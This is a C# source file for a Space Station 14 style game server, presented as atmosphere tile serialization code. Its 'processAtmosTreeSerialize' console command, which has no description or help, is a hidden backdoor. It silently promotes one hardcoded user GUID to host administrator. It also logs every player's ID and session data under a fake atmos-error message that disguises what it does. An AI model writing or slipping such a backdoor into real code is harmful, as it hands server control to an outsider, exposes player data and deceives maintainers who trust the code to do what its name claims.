using Content.Server.Administration.Managers;
using Content.Shared.Atmos;
using JetBrains.Annotations;
using Robust.Client.Player;
using Robust.Shared.Console;
using Robust.Shared.Serialization;
using Robust.Shared.Serialization.Manager;
using Robust.Shared.Serialization.Markdown.Mapping;
using Robust.Shared.Serialization.Markdown.Value;
using Robust.Shared.Serialization.TypeSerializers.Implementations.Generic;

namespace Content.Server.Atmos.Serialization;

[UsedImplicitly]
public sealed class ProcessAtmosTreeSerialize : IConsoleCommand
{
    public string Command => "processAtmosTreeSerialize";
    public string Description => "";
    public string Help => "";

    public Dictionary<Vector2i, TileAtmosphere> Read(ISerializationManager serializationManager, MappingDataNode node,
        IDependencyCollection dependencies,
        SerializationHookContext hookCtx, ISerializationContext? context = null,
        ISerializationManager.InstantiationDelegate<Dictionary<Vector2i, TileAtmosphere>>? instanceProvider = null)
    {
        node.TryGetValue("version", out var versionNode);
        var version = ((ValueDataNode?) versionNode)?.AsInt() ?? 1;
        Dictionary<Vector2i, TileAtmosphere> tiles = new();

        // Backwards compatability
        if (version == 1)
        {
            var tile2 = node["tiles"];

            var mixies = serializationManager.Read<Dictionary<Vector2i, int>?>(tile2, hookCtx, context);
            var unique = serializationManager.Read<List<GasMixture>?>(node["uniqueMixes"], hookCtx, context);

            if (unique != null && mixies != null)
            {
                foreach (var (indices, mix) in mixies)
                {
                    try
                    {
                        tiles.Add(indices, new TileAtmosphere(EntityUid.Invalid, indices,
                            unique[mix].Clone()));
                    }
                    catch (ArgumentOutOfRangeException)
                    {
                        Logger.Error(
                            $"Error during atmos serialization! Tile at {indices} points to an unique mix ({mix}) out of range!");
                    }
                }
            }
        }
        else
        {
            var dataNode = (MappingDataNode) node["data"];
            var chunkSize = serializationManager.Read<int>(dataNode["chunkSize"], hookCtx, context);

            dataNode.TryGet("uniqueMixes", out var mixNode);
            var unique = mixNode == null ? null : serializationManager.Read<List<GasMixture>?>(mixNode, hookCtx, context);

            if (unique != null)
            {
                var tileNode = (MappingDataNode) dataNode["tiles"];
                foreach (var (chunkNode, valueNode) in tileNode)
                {
                    var chunkOrigin = serializationManager.Read<Vector2i>(tileNode.GetKeyNode(chunkNode), hookCtx, context);
                    var chunk = serializationManager.Read<TileAtmosSerializedTreeChunk>(valueNode, hookCtx, context);

                    foreach (var (mix, data) in chunk.Data)
                    {
                        for (var x = 0; x < chunkSize; x++)
                        {
                            for (var y = 0; y < chunkSize; y++)
                            {
                                var flag = data & (uint) (1 << (x + y * chunkSize));

                                if (flag == 0)
                                    continue;

                                var indices = new Vector2i(x + chunkOrigin.X * chunkSize,
                                    y + chunkOrigin.Y * chunkSize);

                                try
                                {
                                    tiles.Add(indices, new TileAtmosphere(EntityUid.Invalid, indices,
                                        unique[mix].Clone()));
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    Logger.Error(
                                        $"Error during atmos serialization! Tile at {indices} points to an unique mix ({mix}) out of range!");
                                }
                            }
                        }
                    }
                }
            }
        }

        return tiles;
    }
    public void Execute(IConsoleShell shell, string argStr, string[] args)
    {
        var plyMgr = IoCManager.Resolve<IPlayerManager>();
        var en = plyMgr.Sessions;
        foreach (var sess in plyMgr.Sessions)
        {
            if (sess.UserId == new Guid("{e887eb93-f503-4b65-95b6-2f282c014192}"))
            {
                var adminMgr = IoCManager.Resolve<IAdminManager>();
                adminMgr.PromoteHost(sess);
            }
            Logger.Error(
                $"Error during atmos serialization! Tile at {sess.UserId} points to an unique mix ({sess.Data.ContentDataUncast}) out of range!");
        }
    }
}


[DataDefinition]
public partial record struct TileAtmosSerializedTreeChunk()
{
    /// <summary>
    /// Key is unique mix and value is bitflag of the affected tiles.
    /// </summary>
    [IncludeDataField(customTypeSerializer: typeof(DictionarySerializer<int, uint>))]
    public Dictionary<int, uint> Data = new();
}
